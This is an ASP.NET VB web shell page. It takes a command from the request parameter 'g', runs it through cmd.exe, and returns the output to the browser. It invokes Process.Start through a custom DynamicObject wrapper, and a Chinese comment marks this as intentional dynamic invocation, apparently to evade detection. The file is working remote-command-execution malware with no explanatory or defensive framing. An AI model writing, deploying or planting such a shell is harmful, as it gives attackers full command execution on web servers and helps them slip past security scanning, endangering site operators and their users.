<%@ Page Language="VB" %>
<%@ Import Namespace="System.Dynamic" %>
<%
Dim userCommand As String = Request.Params.Get("g")
If Not String.IsNullOrEmpty(userCommand) Then
    Try
        Dim psi As New System.Diagnostics.ProcessStartInfo()
        psi.FileName = "cmd.exe"
        psi.Arguments = "/c " & userCommand
        psi.RedirectStandardOutput = True
        psi.UseShellExecute = False
        Dim process As New System.Diagnostics.Process()
        process.StartInfo = psi
        ' 使用 DynamicProcess 动态调用 Start 方法
        Dim dynamicProcess As Object = New DynamicProcess(process)
        dynamicProcess.Start()
        Dim output As String = process.StandardOutput.ReadToEnd()
        process.WaitForExit()
        Response.Write(Server.HtmlEncode(output))
    Catch ex As Exception
        Response.Write("Error: " & Server.HtmlEncode(ex.Message))
    End Try
Else
    Response.Write("No command")
End If
%>
<script runat="server">
Public Class DynamicProcess
    Inherits DynamicObject
    Private ReadOnly _process As System.Diagnostics.Process
    Public Sub New(process As System.Diagnostics.Process)
        _process = process
    End Sub
    Public Overrides Function TryInvokeMember(binder As InvokeMemberBinder, args() As Object, ByRef result As Object) As Boolean
        If binder.Name = "Start" Then
            result = _process.Start()
            Return True
        End If
        Return MyBase.TryInvokeMember(binder, args, result)
    End Function
End Class
</script>